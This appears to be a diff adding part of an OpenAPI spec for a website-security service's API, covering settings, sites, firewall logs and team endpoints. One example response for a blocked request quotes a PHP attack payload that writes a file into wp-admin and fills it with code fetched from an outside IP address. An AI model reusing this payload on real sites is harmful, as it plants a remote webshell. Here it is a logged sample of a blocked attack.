+      description: 'Get the Slack settings.'
+      operationId: 6c8af3ac5c0bef5b5a718a75019a804c
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                properties:
+                  integrated: { description: 'Whether or not it has been integrated.', type: boolean, example: true }
+                  channel: { description: 'The channel name to send alerts to.', type: string, example: '#patchstack-alerts' }
+                type: object
+              example:
+                integrated: true
+                channel: '#patchstack-alerts'
+  /settings/api:
+    get:
+      tags:
+        - Settings
+      summary: 'Get vulnerability database API settings'
+      description: 'Get the vulnerability database API settings.'
+      operationId: 717ef00a4e01d92b7a8632ab0e14812e
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                properties:
+                  token: { description: 'The API token.', type: string, example: THISISTHETOKEN }
+                  limit: { description: 'The number of requests allowed per 24 hours.', type: integer, example: 500 }
+                  requests: { description: 'The current number of requests sent in the past 24 hours.', type: integer, example: 500 }
+                type: object
+              example:
+                token: THISISMYTOKEN
+                limit: 500
+                requests: 500
+  /settings/update/api:
+    post:
+      tags:
+        - Settings
+      summary: 'Request vulnerability database API token'
+      description: 'Request a vulnerability database API token.'
+      operationId: 70d3028b1298af8660fe7284279b8fbc
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                properties:
+                  token: { description: 'The API token.', type: string, example: THISISTHETOKEN }
+                  success: { description: 'Success message.', type: string, example: 'A token has been assigned.' }
+                type: object
+              example:
+                success: 'A token has been assigned.'
+                token: THISISMYTOKEN
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'Token already assigned to this user.'
+  /settings/api/request/app:
+    post:
+      tags:
+        - Settings
+      summary: 'Request App API token'
+      description: 'Request an App API token.'
+      operationId: daa875b20d1e507becbc0f7e5638c105
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                properties:
+                  success: { description: 'Success message.', type: string, example: 'A token has been assigned.' }
+                  token: { description: 'The App API token.', type: string, example: THISISTHETOKEN }
+                type: object
+              example:
+                success: 'A token has been assigned.'
+                token: THISISMYTOKEN
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'Token already assigned to this user.'
+  /settings/api/terminate/app:
+    delete:
+      tags:
+        - Settings
+      summary: 'Remove App API token'
+      description: 'Remove the App API token.'
+      operationId: 6baf94f3790fbe17d2d8b7df7bf5d2f7
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                properties:
+                  success: { description: 'Success message.', type: string, example: 'The App API key has been deleted.' }
+                type: object
+              example:
+                success: 'The App API key has been deleted.'
+  /settings/terminate:
+    delete:
+      tags:
+        - Settings
+      summary: 'Terminate account'
+      description: "Terminate an account.\nThis will instantly delete all sites and terminate the subscription.\nIt will also schedule the deletion of the account in a month from now."
+      operationId: 6459fb46ce9fb811734f31e290d38539
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                properties:
+                  date: { description: 'Formatted date of account deletion.', type: string, example: '17 August, 2024' }
+                type: object
+              example:
+                date: '17 August, 2024'
+  /settings/unterminate:
+    post:
+      tags:
+        - Settings
+      summary: 'Cancel termination'
+      description: 'Cancel the scheduled deletion of an account.'
+      operationId: 2a671005e3f4fb1e18b73c4509d134d9
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The termination has been cancelled.'
+  '/site/view/{site}':
+    get:
+      tags:
+        - Sites
+      summary: 'Get site information'
+      description: 'View a specific site'
+      operationId: d246365f4afc2083b225e4cf2ae84632
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: 'Returns basic information of a specific site.'
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { site: { description: 'Site data.', properties: { id: { description: 'The unique identifier of the site.', type: integer, example: 1 }, url: { description: 'URL of site.', type: string, example: 'https://test.com' }, url_domain: { description: 'Domain name of the site.', type: string, example: test.com }, created_at: { description: 'Creation timestamp.', type: string, example: '2024-08-13' }, cms: { description: 'CMS of the site.', type: string, enum: [WordPress, Drupal, Joomla], example: WordPress }, firewall_enabled: { description: 'Firewall enabled status (sent from the connector).', type: boolean, example: true }, oauth: { description: 'API key details object.', properties: { id: { description: 'Secret identifier.', type: integer, example: 1 }, secret: { description: 'Secret key.', type: string, example: THISISMYSECRETTOKEN } }, type: object }, plugin_version: { description: 'The connector version installed on the site.', type: string, example: 2.2.10 }, expiration: { description: 'When the subscription of the owner of the site will expire.', type: string, example: '2024-10-19' }, class: { description: 'The class of the owner of the site (subscription related).', type: integer, enum: [0, 1, 6, 7], example: 6 }, owner: { description: 'Site owner object.', properties: { id: { description: 'The unique identifier of the owner of the site.', type: integer, example: 1 }, name: { description: 'The name of the owner of the site.', type: string, example: 'Owner name' } }, type: object }, activated: { description: 'Whether or not the connector has been activated.', type: boolean, example: true }, plugin_installed: { description: 'Whether or not the connector has been activated.', type: boolean, example: true } }, type: object }, stats: { description: 'Site statistics.', properties: { components_count_sum: { description: 'Number of total software components.', type: integer, example: 1 }, components_vulnerable_sum: { description: 'Number of total vulnerable software components.', type: integer, example: 1 }, components_outdated_sum: { description: 'Number of total outdated software components.', type: integer, example: 1 }, components_disabled_sum: { description: 'Number of total disabled software components.', type: integer, example: 1 }, vulnerable_high_sum: { description: 'Number of total high risk vulnerabilities.', type: integer, example: 1 }, vulnerable_medium_sum: { description: 'Number of total medium risk vulnerabilities.', type: integer, example: 1 }, vulnerable_low_sum: { description: 'Number of total low risk vulnerabilities.', type: integer, example: 1 } }, type: object }, attacks: { description: 'Array holding latest 30 day attacks blocked statistics.', type: array, items: { properties: { num: { description: 'Number of attacks blocked', type: integer, example: 1 }, dateday: { description: 'Formatted date of when the attacks were blocked', type: string, example: '2024-07-22' } }, type: object } }, ping: { description: 'Site <-> connector ping status.', properties: { firewall_status: { description: 'Firewall enabled state in latest ping.', type: boolean, example: true }, updated_at: { description: 'Latest time of ping receival.', type: string, example: '2024-07-22 00:02:02' }, site_url: { description: 'The URL received from the connector during last ping Can be used to determine mismatch connector installation.', type: string, example: 'https://test.com' }, sent_pings: { description: 'Number of sent ping attempts from server-side before turning to delayed state.', type: integer, example: 0 }, deactivated: { description: 'Deactivation state occurs after 24 hours.', type: boolean, example: false }, minutes: { description: 'The number of minutes since the most recent ping receival.', type: integer, example: 60 } }, type: object } }
+                  type: object
+              example:
+                site:
+                  id: 1
+                  url: 'https:\/\/test.com'
+                  url_domain: test.com
+                  created_at: '2024-08-13'
+                  cms: WordPress
+                  firewall_enabled: 1
+                  oauth: { id: 1, secret: THISISMYSECRETTOKEN }
+                  plugin_version: 2.2.13
+                  expiration: '2024-09-02'
+                  class: 6
+                  owner: { id: 1, name: 'Owner Name' }
+                  activated: true
+                  plugin_installed: true
+                stats:
+                  components_count_sum: 36
+                  components_vulnerable_sum: 0
+                  components_outdated_sum: 4
+                  components_disabled_sum: 3
+                  vulnerable_high_sum: 0
+                  vulnerable_medium_sum: 0
+                  vulnerable_low_sum: 0
+                attacks:
+                  - { num: 0, dateday: '2024-07-21' }
+                  - { num: 0, dateday: '2024-07-22' }
+                ping:
+                  firewall_status: 1
+                  updated_at: '2024-08-15 06:02:38'
+                  site_url: 'https:\/\/test.com'
+                  sent_pings: 0
+                  deactivated: false
+                  minutes: 90
+  '/site/state/{site}':
+    get:
+      tags:
+        - Sites
+      summary: 'View site activation state'
+      description: 'View the activation state of a specific site.'
+      operationId: a6ef118c851ff44736580ac25a68a5a8
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: 'View the activation state of a specific site.'
+          content:
+            application/json:
+              schema: {  }
+              example:
+                activated: true
+  /sites/list:
+    get:
+      tags:
+        - Sites
+      summary: 'Get sites'
+      description: 'Show a list of all sites of the user.'
+      operationId: 8ef06817366db34900faeabdc1e62068
+      requestBody:
+        required: false
+        content:
+          application/json:
+            schema:
+              required:
+                - search
+                - page
+                - per_page
+                - column
+                - direction
+              properties:
+                search:
+                  description: 'Search for string in site URL.'
+                  type: string
+                page:
+                  description: 'Current pagination page'
+                  type: integer
+                  default: 1
+                per_page:
+                  description: 'Pagination items per page'
+                  type: integer
+                  default: 20
+                column:
+                  description: 'Column to order by.'
+                  type: string
+                  default: id
+                  enum: [id, connected, protected, software, vulnerable, outdated, url]
+                direction:
+                  description: 'Direction of ordering.'
+                  type: string
+                  default: desc
+                  enum: [asc, desc]
+              type: object
+      responses:
+        '200':
+          description: 'Show a list of all sites of the user.'
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { sites: { description: 'Sites data.', properties: { id: { description: 'The unique identifier of the site.', type: integer, example: 1 }, url: { description: 'URL of site.', type: string, example: 'https://test.com' }, url_domain: { description: 'Domain name of the site.', type: string, example: test.com }, cms: { description: 'CMS of the site.', type: string, enum: [WordPress, Drupal, Joomla], example: WordPress }, cms_id: { description: 'CMS identifier.', type: integer, example: 1 }, addon_protection: { description: 'If class = 0, dictates if paid protection is enabled.', type: boolean, example: false }, class: { description: 'Subscription class of the owner of the site.', type: integer, enum: [0, 1, 6, 7], example: 6 }, firewall_enabled: { description: 'Firewall enabled status (sent from the connector).', type: boolean, example: true }, ping: { description: 'Site <-> connector ping status.', properties: { firewall_status: { description: 'Firewall enabled state in latest ping.', type: boolean, example: true }, updated_at: { description: 'Latest time of ping receival.', type: string, example: '2024-07-22 00:02:02' }, site_url: { description: 'The URL received from the connector during last ping Can be used to determine mismatch connector installation.', type: string, example: 'https://test.com' }, sent_pings: { description: 'Number of sent ping attempts from server-side before turning to delayed state.', type: integer, example: 0 }, deactivated: { description: 'Deactivation state occurs after 24 hours.', type: boolean, example: false }, minutes: { description: 'The number of minutes since the most recent ping receival.', type: integer, example: 60 } }, type: object }, plugin_installed: { description: 'Whether or not the connector has been activated.', type: boolean, example: true }, counters: { description: 'Site counters.', properties: { components_count: { description: 'Number of total software components.', type: integer, example: 1 }, components_outdated: { description: 'Number of total outdated software components.', type: integer, example: 1 }, vulnerable_total: { description: 'Number of total vulnerabilities.', type: integer, example: 1 } }, type: object }, plugin_version: { description: 'The installed version of the connector.', type: string, example: 2.2.20 }, chart_data: { description: 'Latest 7 days of firewall attack data.', type: array, items: { properties: { '2024-04-04': { description: 'Key is the date, value attacks blocked.', type: integer, example: 1 } }, type: object } }, modules: { description: 'Protection modules enabled on this site.', type: array, items: { properties: { id: { description: 'Unique identifier of the module.', type: integer, example: 1 }, title: { description: 'Title of the module.', type: string, example: 'vPatch Module' }, title_short: { description: 'Abbreviated title of module.', type: string, example: VP }, is_user_module: { description: 'Whether or not this is a module of the user.', type: boolean, example: false } }, type: object } }, site_groups: { description: 'Site groups attached to this site.', type: array, items: { properties: { id: { description: 'Unique identifier of the site group.', type: integer, example: 1 }, title: { description: 'Title of the site group.', type: string, example: 'Customer XYZ' } }, type: object } } }, type: object } }
+                  type: object
+              example:
+                sites:
+                  - { id: 12345, url: 'https://test.com', url_domain: test.com, cms: WordPress, addon_protection: 0, class: 6, firewall_enabled: 1, ping: { firewall_status: 1, updated_at: '2024-07-18 07:50:04', site_url: 'https://test.com', deactivated: false, minutes: 73 }, plugin_installed: true, counters: { components_count: 47, components_outdated: 10, vulnerable_total: 3 }, plugin_version: 2.2.13, chart_data: { '2024-07-12': 38, '2024-07-13': 27, '2024-07-14': 21, '2024-07-15': 18, '2024-07-16': 58, '2024-07-17': 45, '2024-07-18': 6 }, modules: [{ id: 178, title: vPatching, title_short: VP, is_user_module: false }], site_groups: [{ id: 12, title: 'My site group' }] }
+                total: 1
+  /sites/list/basic:
+    post:
+      tags:
+        - Sites
+      summary: 'Get sites basic list'
+      description: 'Show a list of all sites of the user, in a basic format.'
+      operationId: ecbe6163934d2df32f704cb01cae0467
+      requestBody:
+        required: false
+        content:
+          application/json:
+            schema:
+              properties:
+                search:
+                  description: 'If set, search in URL.'
+                  type: string
+                exclude:
+                  description: 'If set, exclude this site identifier from the result set.'
+                  type: integer
+                new:
+                  description: 'If set, order by identifier descending (new first).'
+                  type: boolean
+                limit:
+                  description: 'If set, limit to 10 sites.'
+                  type: boolean
+              type: object
+      responses:
+        '200':
+          description: 'Returns a basic list of all sites of the account.'
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { sites: { description: Sites, type: array, items: { properties: { id: { description: 'The unique identifier of the site.', type: integer, example: 1 }, url: { description: 'URL of site.', type: string, example: 'https://test.com' } }, type: object } } }
+                  type: object
+              example:
+                -
+                  id: 12345
+                  url: 'http://test.com'
+  '/site/update/{site}':
+    post:
+      tags:
+        - Sites
+      summary: 'Update site'
+      description: 'Update a specific site.'
+      operationId: 5653961b042399e8274f3da22518865b
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - email
+                - url
+                - cms
+              properties:
+                email:
+                  description: 'Email of the site owner, unused.'
+                  type: string
+                  example: test@test.com
+                  deprecated: true
+                url:
+                  description: 'URL to change it to.'
+                  type: string
+                  example: 'https://test.com'
+                cms_id:
+                  $ref: '#/components/schemas/cms_id'
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The site has been updated.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'The site url is invalid, please double check.'
+  '/site/delete/{site}':
+    delete:
+      tags:
+        - Sites
+      summary: 'Delete site'
+      description: 'Delete a specific site.'
+      operationId: 3ebcb454c2ad6d4098a541c4c5d939be
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: true
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'You are not allowed to delete sites.'
+  /site/delete:
+    delete:
+      tags:
+        - Sites
+      summary: 'Delete multiple sites'
+      description: 'Delete a batch of sites.'
+      operationId: df2162f56c3eb06dd2b1806f413e7e0f
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - sites
+              properties:
+                sites:
+                  description: 'Array of site identifiers to delete from the account.'
+                  type: array
+                  items: { type: int }
+                  example: [1, 2]
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'Successfully deleted the sites.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'Invalid request data. \ You are not allowed to delete sites.'
+  /site/add:
+    post:
+      tags:
+        - Sites
+      summary: 'Add site(s)'
+      description: 'Add one or more sites at once.'
+      operationId: 565eeffd1616c74665d439a4d77bca4b
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - urls
+                - cms_id
+              properties:
+                urls:
+                  type: array
+                  items: { type: string }
+                  example: ['https://test1.com', 'https://test2.com']
+                cms_id:
+                  $ref: '#/components/schemas/cms_id'
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { success: { description: Success, type: string, example: 'Successfully added the site(s).' }, count: { description: 'Number of sites added.', type: integer, example: 2 }, lastid: { description: 'Contains the unique identifier of the last site added.', type: integer, example: 1234 } }
+                  type: object
+              example:
+                success: 'Successfully added the site(s).'
+                count: 2
+                lastid: 1234
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'The site could not be added.'
+  /site/cost:
+    post:
+      tags:
+        - Sites
+      summary: 'Get community protection cost'
+      description: 'Calculate the cost for community user to enable protection.'
+      operationId: fb85566f60dc164f85cf6088e61cdfa9
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { cost: { description: Cost, type: string, example: '5.00' }, cost_now: { description: 'Cost now', type: string, example: '5.00' } }
+                  type: object
+              example:
+                cost: '5.00'
+                cost_now: '5.00'
+  '/site/oauth/{site}':
+    get:
+      tags:
+        - Sites
+      summary: 'Get site API key'
+      description: 'Get the API id and secret key for the connector.'
+      operationId: 2483626328ba3fc02dfaa53aa294e4c0
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: 1
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { id: { description: ID, type: integer, example: 1234 }, secret: { description: Decret, type: string, example: MYSECRETTOKEN } }
+                  type: object
+              example:
+                id: 1234
+                secret: MYSECRETTOKEN
+  '/site/firewall/logs/{site}/{days}':
+    get:
+      tags:
+        - Sites
+      summary: 'Get site firewall statistics'
+      description: 'Get the firewall attack statistics of given week.'
+      operationId: c7f9916ab25c861c5e2e6e9e66f3121f
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: 1
+        -
+          name: days
+          in: path
+          description: 'Days to go back for the logs.'
+          required: true
+          example: 30
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { attacks: { description: 'Attacks blocked per day based on the date parameter.', properties: { num: { description: 'Number of attacks blocked.', type: integer, example: 0 }, dateday: { description: 'Date of the attacks blocked.', type: string, example: '2024-10-19' } }, type: object } }
+                  type: object
+              example:
+                -
+                  num: 0
+                  dateday: '2024-10-21'
+                -
+                  num: 0
+                  dateday: '2024-10-22'
+  '/site/firewalllogs/data/{site}/{logid}':
+    get:
+      tags:
+        - Sites
+      summary: 'Get blocked request information'
+      description: 'Get the POST data for given blocked request ID.'
+      operationId: c84b640c753d57d81004c31785512481
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+        -
+          name: logid
+          in: path
+          description: 'The _id value of the firewalllogs route return set.'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { action: { description: 'The action that occurred.', type: string, example: Block }, cc: { description: 'Country code information of the IP address.', properties: { country: { description: 'The full name of the country.', type: string, example: 'United States' }, iso_code: { description: 'The ISO format of the country.', type: string, example: US } }, type: object }, description: { description: 'Description of the firewall rule.', type: string, example: Unknown }, domain: { description: 'The URL of the site.', type: string, example: 'https://test.com' }, fid: { description: 'Category of firewall rule, unused.', type: string, example: DT, deprecated: true }, ip: { description: 'IP address.', type: string, example: 123.123.123.123 }, license_id: { description: 'Internal identifier.', type: integer, example: 12345 }, log_date: { description: 'Date of log entry.', type: string, example: '2024-01-09T13:39:27.000Z' }, method: { description: 'HTTP request method.', type: string, example: POST }, post_data: { description: 'The request payload data in JSON format.', type: string, example: /my-test-url }, request_uri: { description: 'Request URL that has been blocked.', type: string, example: /my-test-url }, user_agent: { description: 'The HTTP user agent.', type: string, example: 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36' } }
+                  type: object
+              example:
+                license_id: 1
+                ip: 127.0.0.1
+                fid: Unknown
+                request_uri: /my-test-url
+                user_agent: 'Mozlila\/5.0 (Linux; Android 7.0; SM-G892A Bulid\/NRD90M; wv) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/60.0.3112.107 Moblie Safari\/537.36'
+                method: POST
+                log_date: 'January 9th, 2024 · 13:39:27'
+                post_data: '{\n    \"vz\": \"$x=fwrite(fopen($_SERVER[\''DOCUMENT_ROOT\''].\''\/wp-admin\/css\/colors\/blue\/uploader.php\'',\''w+\''),file_get_contents(\''http:\/\/51.79.124.111\/vz.txt\''));echo \\\\"aDriv4\\\\".$x;\"\n}'
+                action: Block
+                description: Unknown
+                cc:
+                  country: Unknown
+                  iso_code: Unknown
+                domain: 'https://test.com'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'Could not find data for given request id.'
+  '/site/activitylogs/{site}':
+    post:
+      tags:
+        - Sites
+      summary: 'Get activity logs'
+      description: 'Fetch the activity logs of a site.'
+      operationId: eb6b15f4f6c01a18b02b1db52ca34194
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: 1
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - page
+                - search
+              properties:
+                page:
+                  description: 'Current pagination page.'
+                  type: integer
+                  example: 1
+                search:
+                  description: 'String to search for in author name or IP address.'
+                  type: string
+                  example: ''
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { logs: { description: Logs, type: array, items: { properties: { action: { description: 'Action that occurred.', type: string, example: 'logged in' }, author: { description: 'Username of who executed the action.', type: string, example: James }, cc: { description: 'Country code information of the IP address.', properties: { country: { description: 'The full name of the country.', type: string, example: 'United States' }, iso_code: { description: 'The ISO format of the country.', type: string, example: US } }, type: object }, date: { description: 'Raw datetime.', type: string, example: '2024-11-12T11:59:33.000Z' }, datetime: { description: 'Formated date.', type: string, example: 'January 9th, 2024 · 13:39:27' }, ip: { description: 'IP address.', type: string, example: 123.123.123.123 }, license_id: { description: 'Internal identifier.', type: integer, example: 12345 }, object: { description: 'The related object of the action.', type: string, example: user }, object_id: { description: 'The unique identifier of the object.', type: string, example: '12' }, object_name: { description: 'The name of the object.', type: string, example: James } }, type: object } }, total: { description: Total, type: integer, example: 1 } }
+                  type: object
+              example:
+                logs:
+                  license_id: 12345
+                  author: test
+                  ip: 123.123.123.123
+                  object: user
+                  object_id: '18'
+                  object_name: test
+                  action: updated
+                  date: '2024-11-12T11:59:33.000Z'
+                  cc: { country: 'United Kingdom', iso_code: GB }
+                  datetime: 'November 12th, 2024 \u00b7 11:59:33'
+                total: 1
+  /team/enable:
+    post:
+      tags:
+        - Team
+      summary: 'Enables team feature'
+      description: 'Enables the team feature on the account.'
+      operationId: 9cda272c624059cadc770fec99972ce1
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The team feature has been enabled.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'You are already part of a team.'
+  /team/add/member:
+    post:
+      tags:
+        - Team
+      summary: 'Add team member'
+      description: 'Create a new team member.'
+      operationId: b95303633379767337531a8062f90d5c
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - name
+                - email
+                - permission
+              properties:
+                name:
+                  description: 'Name of the team member.'
+                  type: string
+                  example: Name
+                email:
+                  description: 'Email of the team member.'
+                  type: string
+                  example: test@test.com
+                permission:
+                  description: 'The permission.'
+                  type: string
+                  enum: [admin, manager, member]
+                  example: admin
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The user has been added to the team and an invitation email has been sent.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'The member cannot be added to the team due to an unexpected error, contact support for further assistance.'
+  '/team/delete/{user}':
+    delete:
+      tags:
+        - Team
+      summary: 'Delete team member'
+      description: 'Delete a team member.'
+      operationId: 70c0010d0712f6ac2a6fbb24a4ea24d2
+      parameters:
+        -
+          name: user
+          in: path
+          description: 'The unique identifier of the team member.'
+          required: true
+          example: 1
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The member has been removed from the team and all associated data has been deleted.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'This user cannot be deleted or does not belong to your team.'
+  '/team/associate/{user}/{site}':
+    post:
+      tags:
+        - Team
+      summary: 'Team member site association'
+      description: 'Associate or de-associate a member with a site.'
+      operationId: 564fb8018fd10ace61ff945df22eb995
+      parameters:
+        -
+          name: user
+          in: path
+          description: 'The unique identifier of the team member.'
+          required: true
+          example: 1
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: 1
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The user has been associated with the site.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'This user/site does not belong to your team.'
+  /team/members:
+    get:
+      tags:
+        - Team
+      summary: 'Get team members'
+      description: 'List the team members.'
+      operationId: e9510207242e26a073065d16e6b9116b
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { members: { description: 'Array of members.', type: array, items: { properties: { id: { description: 'The team member identifier.', type: integer, example: 1 }, userid: { description: 'The unique identifier of the team member.', type: integer, example: 1 }, name: { description: Name, type: string, example: Test }, email: { description: Email, type: string, example: test@test.com }, permission: { description: Permission, type: string, example: owner }, created_at: { description: 'Creation date', type: string, example: '2023-12-15 07:46:16' }, last_login: { description: 'Last login', type: string, example: '2023-12-15 07:46:16' }, sites: { description: 'Array of sites associated to this team member.', type: array, items: { properties: { id: { description: 'The unique identifier of the site.', type: integer, example: 1 }, url: { description: 'URL of site.', type: string, example: 'https://test.com' } }, type: object } } }, type: object } }, total: { description: 'Total number of team members.', type: integer, example: 1 } }
+                  type: object
+              example:
+                members:
+                  id: 1
+                  userid: 1
+                  name: Test
+                  email: test@test.com
+                  permission: owner
+                  created_at: '2023-12-15 07:46:16'
+                  last_login: '2023-12-15 07:46:16'
+                  sites: [{ id: 1, url: 'https://test.com' }]
+                total: 1
+  /team/sites:
+    get:
+      tags:
+        - Team
+      summary: 'Get team sites'
+      description: 'List the team sites and who is associated to what site.'
+      operationId: 5ba1cf4ae06d1c8b6d9e39beaaec1871
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { sites: { description: Sites, type: array, items: { properties: { id: { description: 'The unique identifier of the site.', type: integer, example: 1 }, url: { description: 'URL of site.', type: string, example: 'https://test.com' }, managed_by: { description: 'Name of team member who manages this site.', type: string, example: 'Team member name' } }, type: object } }, total: { description: 'Total number of sites.', type: integer, example: 1 } }
+                  type: object
+              example:
+                sites:
+                  - { id: 1, url: 'https://test.com', managed_by: 'Team member name' }
+                total: 1
+components:
+  schemas:
+    alert_trigger_value:
+      description: 'Value of the trigger condition, only applies if subtype is IP, URL or Payload.'
+      type: string
+      example: ''
+    alert_trigger_valuetype:
+      description: 'Comparison to use for the trigger.'
+      type: string
+      enum:
+        - ''
+        - contains
+        - 'equals (==)'
+        - 'bigger than or equal (>=)'
+        - 'lower than or equal (<=)'
+      example: ''
+    alert_trigger_condition:
+      description: 'Trigger conditions of the alert.'
+      type: array
+      items:
+        properties:
+          value:
+            $ref: '#/components/schemas/alert_trigger_value'
+          attribute:
+            description: 'Attribute of the trigger condition.'
+            type: string
+            enum:
+              - outdated
+              - vulnerable
+              - 'user_logged in'
+              - user_registered
+              - post_deleted
+              - post_trashed
+              - attachment_added
+              - plugin_installed
+              - plugin_deactivated
+              - plugin_activated
+              - domain_expiring
+              - ssl_expiring
+              - blacklist_entry
+              - IP
+              - URL
+              - Payload
+            example: vulnerable
+          comparison:
+            $ref: '#/components/schemas/alert_trigger_valuetype'
+        type: object
+    alert_trigger_alert_type:
+      description: 'The alert action to take.'
+      type: string
+      enum:
+        - 'email notification'
+        - 'slack notification'
+        - 'email & slack notification'
+      example: 'email notification'
+    alert_trigger_action:
+      description: 'Action to execute if a trigger occurs.'
+      type: array
+      items:
+        properties:
+          alert:
+            $ref: '#/components/schemas/alert_trigger_alert_type'
+          target:
+            description: 'The target of the alert, empty if slack notification.'
+            type: string
+            example: test@test.com
+        type: object
+    alert_trigger_type:
+      description: 'The type of alert.'
+      type: string
+      enum:
+        - software
+        - scan
+        - activity
+        - firewall
+      example: software
+    alert_trigger_subtype:
+      description: 'The subtype of the alert.'
+      type: string
+      enum:
+        - outdated
+        - vulnerable
+        - 'user_logged in'
+        - user_registered
+        - post_deleted
+        - post_trashed
+        - attachment_added
+        - plugin_installed
+        - plugin_deactivated
+        - plugin_activated
+        - domain_expiring
+        - ssl_expiring
+        - blacklist_entry
+        - IP
+        - URL
+        - Payload
+      example: vulnerable
+    cms_id:
+      description: 'The identifier of the CMS. 1 = WordPress, 2 = Drupal, 3 = Joomla. 0 = all for filtering.'
+      type: integer
+      enum:
+        - 0
+        - 1
+        - 2
+        - 3
+  securitySchemes:
+    ApiKey:
+      type: apiKey
+      name: UserToken
+      in: header
+security:
+  -
+    ApiKey: []
+tags:
+  -
+    name: Alert
+    description: Alert
+  -
+    name: Alert
+    description: Alert
+  -
+    name: Alert
+    description: Alert
+  -
+    name: Alert
+    description: Alert
+  -
+    name: Alert
+    description: Alert
+  -
+    name: Alert
+    description: Alert
+  -
+    name: Billing
+    description: Billing
+  -
+    name: Billing
+    description: Billing
+  -
+    name: Billing
+    description: Billing
+  -
+    name: Billing
+    description: Billing
+  -
+    name: Billing
+    description: Billing
+  -
+    name: Billing
+    description: Billing
+  -
+    name: Billing
+    description: Billing
+  -
+    name: Billing
+    description: Billing
+  -
+    name: Billing
+    description: Billing
+  -
+    name: Billing
+    description: Billing
+  -
+    name: Software
+    description: Software
+  -
+    name: Software
+    description: Software
+  -
+    name: Software
+    description: Software
+  -
+    name: Software
+    description: Software
+  -
+    name: Dashboard
+    description: Dashboard
+  -
+    name: Dashboard
+    description: Dashboard
+  -
+    name: Dashboard
+    description: Dashboard
+  -
+    name: 'Plugin Download'
+    description: 'Plugin Download'
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
